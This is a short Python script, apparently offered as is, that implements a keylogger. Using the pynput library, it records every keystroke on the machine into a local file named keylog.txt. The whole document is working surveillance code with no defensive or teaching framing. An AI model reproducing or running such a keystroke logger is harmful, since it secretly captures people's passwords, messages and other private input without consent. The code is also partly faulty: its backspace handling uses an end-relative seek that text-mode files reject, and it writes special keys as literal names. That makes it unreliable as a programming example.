from pynput.keyboard import Key, Listener

# Define a function to write key presses to a log file
def on_key_release(key):
    try:
        with open("keylog.txt", "a") as log_file:
            if key == Key.space:
                log_file.write(" ")
            elif key == Key.enter:
                log_file.write("\n")
            elif key == Key.tab:
                log_file.write("\t")
            elif key == Key.backspace:
                log_file.seek(-1, 2)
                log_file.truncate()
            else:
                log_file.write(str(key).replace("'", ""))
    except Exception as e:
        print(f"Error: {str(e)}")

# Set up the keyboard listener
with Listener(on_release=on_key_release) as listener:
    listener.join()
